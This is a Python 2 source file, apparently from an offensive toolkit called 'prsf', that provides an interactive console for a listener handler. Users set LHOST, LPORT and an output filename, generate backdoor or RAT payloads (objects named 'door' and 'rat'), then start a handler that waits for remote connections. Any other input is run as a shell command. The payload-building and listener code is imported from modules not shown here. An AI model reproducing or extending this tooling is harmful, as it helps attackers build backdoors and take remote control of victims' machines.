#!/usr/bin/python
import src.source.use
from src.banner.color import pycolor_style
from src.Logging.print_stdout import print_error
from src.process.MainProcess import Process_Shell
import bin.interfaces.MainConsole
from bin.modules.payloads.Listener_Handler import PayloadListenerHandler
from bin.modules.payloads.Listener_Handler import Listener_Handler_Payloads
import bin.interfaces.source.exploit.modules_exploit
import bin.exploit.ListenerHandler.RemoteHandler
from bin.interfaces.source.help_interfaces.exploit.help_handler import showHelpMessage, showOptionsMessage

host = ""
port = ""
output = ""
class Exploit_Handler(object):
    def __init__(self, values):
        self.command = values

    def main_process(self):
        global host, port, output
        try:
            if self.command == "help":
                print(showHelpMessage())

            elif self.command == "show options":
                print(showOptionsMessage(host, port, output))

            elif self.command == "back":
                bin.interfaces.MainConsole.main_interfaces()

            elif "set LHOST" in self.command:
                try:
                    host = self.command.split()[2]
                    print("LHOST => {}".format(host))
                except IndexError:
                    print_error("Required LHOST!!")

            elif "set LPORT" in self.command:
                try:
                    port = int(self.command.split()[2])
                    print("LPORT => {}".format(port))
                except IndexError:
                    print_error("Required LPORT!!")

            elif "set OUTPUT" in self.command:
                try:
                    output = self.command.split()[2]
                    print("FILE => {}".format(output))
                except IndexError:
                    print_error("Please required output filename to generate!!")

            elif self.command == "generate":
                if host != "" and port != "" and output != "":
                    door = PayloadListenerHandler(host, port, output)
                    door.main_generate()
                else:
                    print(showOptionsMessage(host, port, output))

            elif self.command == "generate -e":
                print
                if host != "" and port != "" and output != "":
                    rat = Listener_Handler_Payloads(host, port, output)
                    rat.writing_payload()
                else:
                    print(showOptionsMessage(host, port, output))

            elif self.command == "run":
                if host != "":
                    print
                    rat = bin.exploit.ListenerHandler.RemoteHandler.Listener_Handler(host, port)
                    rat.main_handler()
                else:
                    print(showOptionsMessage(host, port, output))

            elif self.command == "exploit -e":
                if host != "" and port != "" and output != "":
                    print
                    generate = PayloadListenerHandler(host, port, output)
                    run = bin.interfaces.source.exploit.modules_exploit.Listener_Handler(host, port)
                    generate.main_generate()
                    run.main_handler()
                else:
                    print(showOptionsMessage(host, port, output))

            elif self.command == "exploit":
                if host != "" and port != "" and output != "":
                    print
                    generate = Listener_Handler_Payloads(host, port, output)
                    run = bin.interfaces.source.exploit.modules_exploit.Listener_Handler(host, port)
                    generate.writing_payload()
                    run.main_handler()
                else:
                    print(showOptionsMessage(host, port, output))

            else:
                proc = Process_Shell(self.command)
                proc.main_process()
                
        except IOError as error:
            print_error(str(error))

def Main_Interactive_HandlerRemote():
    try:
        while True:
            cmd = raw_input("{ln}prsf{ln1} exploit({rd}listener_handler{rd1}) > ".format(
                ln=pycolor_style.L, ln1=pycolor_style.W, rd=pycolor_style.R, rd1=pycolor_style.W
            ))
            main = Exploit_Handler(cmd)
            main.main_process()
            if cmd == "exit":
                src.source.use.sys.exit(0)
    except KeyboardInterrupt:
        print_error('Interrupt by user, command "exit" to quit!!')
        Main_Interactive_HandlerRemote()
